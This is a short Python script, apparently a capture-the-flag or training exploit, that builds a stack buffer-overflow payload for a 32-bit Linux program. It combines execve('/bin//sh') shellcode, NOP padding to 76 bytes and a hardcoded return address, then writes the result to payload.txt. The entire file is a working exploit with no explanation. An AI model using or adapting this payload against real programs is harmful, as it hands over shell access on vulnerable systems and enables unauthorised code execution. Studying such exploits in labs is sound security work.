import struct

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

buffer_addr = struct.pack("<I", 0xffffd0e0)  
padding = b"\x90" * (76 - len(shellcode)) 

payload = shellcode + padding + buffer_addr

with open("payload.txt", "wb") as f:
    f.write(payload)

print(f"payload ready")
